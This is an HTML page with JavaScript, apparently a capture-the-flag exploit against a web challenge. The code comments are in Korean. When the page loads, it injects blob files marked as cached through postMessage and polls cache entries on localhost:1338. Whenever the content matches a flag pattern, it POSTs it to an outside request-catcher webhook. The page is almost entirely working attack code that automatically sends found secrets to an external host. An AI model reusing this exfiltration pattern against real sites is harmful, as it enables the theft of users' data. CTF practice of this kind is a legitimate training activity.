<!DOCTYPE html>
<html>
<head>
    <title>Simple Flag Steal</title>
</head>
<body>
    <h1>🚩 Simple Flag Extraction</h1>
    <div id="log"></div>

    <script>
        function log(msg) {
            document.getElementById('log').innerHTML += '<div>' + msg + '</div>';
            console.log(msg);
        }

        async function stealFlag() {
            log("🎯 Starting simple flag steal...");

            // 1. postMessage로 cached=true 파일 추가
            const possibleFlags = [
                "CTF{dummy_flag}",
                "CTF{test_flag}",
                "CTF{postviewer_v5_pwned}",
                "flag{test}",
                // 더 많은 가능한 플래그들...
            ];

            for (const flag of possibleFlags) {
                const blob = new Blob([flag], { type: "text/plain" });
                
                window.postMessage({
                    type: "share",
                    files: [{
                        blob: blob,
                        cached: true,  // 🎯 이게 핵심!
                        name: "flag.txt",
                    }],
                }, "*");
                
                log(`📤 Added cached file: ${flag}`);
            }

            // 2. 캐시된 파일들 읽어오기
            log("🔍 Reading cached files...");
            
            for (let i = 1; i <= 20; i++) {
                try {
                    const response = await fetch(`http://localhost:1338/?cache=${i}`);
                    if (response.ok) {
                        const content = await response.text();
                        log(`✅ Cache ${i}: ${content}`);
                        
                        // 플래그 패턴 체크
                        if (content.includes('CTF{') || content.includes('flag{')) {
                            log(`🚩 FLAG FOUND: ${content}`);
                            
                            // 웹훅으로 전송
                            fetch('https://yhnbdot.request.dreamhack.games', {
                                method: 'POST',
                                body: `FLAG: ${content}`
                            });
                        }
                    }
                } catch (error) {
                    log(`❌ Cache ${i} failed: ${error.message}`);
                }
            }
        }

        // 페이지 로드 후 실행
        window.onload = function() {
            setTimeout(stealFlag, 2000);
        };
    </script>
</body>
</html>
